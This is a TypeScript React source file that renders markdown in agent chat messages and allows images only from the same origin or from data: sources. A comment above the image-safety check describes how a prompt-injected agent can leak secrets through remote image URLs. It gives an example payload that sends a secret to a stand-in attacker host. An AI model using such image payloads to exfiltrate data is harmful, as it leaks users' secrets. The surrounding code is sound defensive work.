import type { ReactNode } from 'react'
import ReactMarkdown from 'react-markdown'
import type { Components } from 'react-markdown'
import remarkGfm from 'remark-gfm'
import { highlightBlock } from './highlight'

/** GFM gives us tables, strikethrough, task lists, autolinks. Shared by the chat
 *  renderer and ArtifactDoc so both parse identically. */
export const MD_PLUGINS = [remarkGfm]

/** Minimal shape of the hast nodes react-markdown hands to custom components. */
export interface HastNode {
  type?: string
  tagName?: string
  value?: string
  position?: { start: { line: number } }
  properties?: { className?: string[] }
  children?: HastNode[]
}

/** Recursively collect the raw text of a hast node (used to pull fenced code). */
export function textOf(node?: HastNode): string {
  if (!node) return ''
  if (node.type === 'text') return node.value ?? ''
  return (node.children ?? []).map(textOf).join('')
}

/** Inline `code` — fenced blocks are handled by PreBlock, so this only fires for
 *  inline spans. */
export function InlineCode({ children }: { children?: ReactNode }) {
  return <code className="md-code">{children}</code>
}

/** Fenced code block: highlight the whole block via the shared hljs set. We render
 *  the block directly (ignoring react-markdown's inner <code>), so InlineCode is
 *  never reached for block code. */
export function PreBlock({ node }: { node?: HastNode }) {
  const codeEl = node?.children?.find((c) => c.tagName === 'code') ?? node?.children?.[0]
  const cls = codeEl?.properties?.className?.[0] ?? ''
  const lang = /language-([\w-]+)/.exec(cls)?.[1] ?? null
  const code = textOf(codeEl).replace(/\n$/, '')
  return <pre className="md-pre"><code className="hljs" dangerouslySetInnerHTML={{ __html: highlightBlock(code, lang) }} /></pre>
}

/** Images in agent- or branch-authored markdown are fetched the moment they
 *  render, so a remote `src` is an exfiltration channel for a prompt-injected
 *  agent (`![](https://attacker/?q=<secret>)`). Only same-origin (the Limn
 *  service itself) and inline `data:image/` sources are safe to load. `origin`
 *  is the page's; without one (server-side render) only data: images pass. */
export function isSafeImageSrc(src: string | undefined, origin: string | undefined = globalThis.location?.origin): boolean {
  if (!src) return false
  if (/^data:image\//i.test(src)) return true
  if (!origin) return false
  try {
    return new URL(src, origin).origin === origin
  } catch {
    return false
  }
}

/** `img` override: a safe source renders as an image; anything else renders as
 *  inert text naming the image and its URL — never fetched, never a link. */
export function SafeImage({ src, alt, title }: { src?: string; alt?: string; title?: string }) {
  if (isSafeImageSrc(src)) return <img className="md-img" src={src} alt={alt ?? ''} title={title} />
  return <span className="md-img-blocked" title="Remote image not loaded">[image: {alt || 'untitled'}]{src ? ` (${src})` : ''}</span>
}

/** Component overrides that carry the chat's existing md-* classNames so styling is
 *  unchanged from the old hand-rolled renderer. */
export const MD_COMPONENTS: Components = {
  p: ({ children }) => <p className="md-p">{children}</p>,
  h1: ({ children }) => <div className="md-h md-h1">{children}</div>,
  h2: ({ children }) => <div className="md-h md-h2">{children}</div>,
  h3: ({ children }) => <div className="md-h md-h3">{children}</div>,
  h4: ({ children }) => <div className="md-h md-h3">{children}</div>,
  h5: ({ children }) => <div className="md-h md-h3">{children}</div>,
  h6: ({ children }) => <div className="md-h md-h3">{children}</div>,
  ul: ({ children }) => <ul className="md-ul">{children}</ul>,
  ol: ({ children }) => <ol className="md-ol">{children}</ol>,
  blockquote: ({ children }) => <blockquote className="md-quote">{children}</blockquote>,
  table: ({ children }) => <table className="md-table">{children}</table>,
  a: ({ href, children }) => <a className="md-link" href={href} target="_blank" rel="noreferrer">{children}</a>,
  img: SafeImage,
  code: InlineCode,
  pre: PreBlock
}

/** Full-featured markdown for agent chat messages. */
export function Markdown({ text }: { text: string }) {
  return (
    <div className="md">
      <ReactMarkdown remarkPlugins={MD_PLUGINS} components={MD_COMPONENTS}>{text}</ReactMarkdown>
    </div>
  )
}
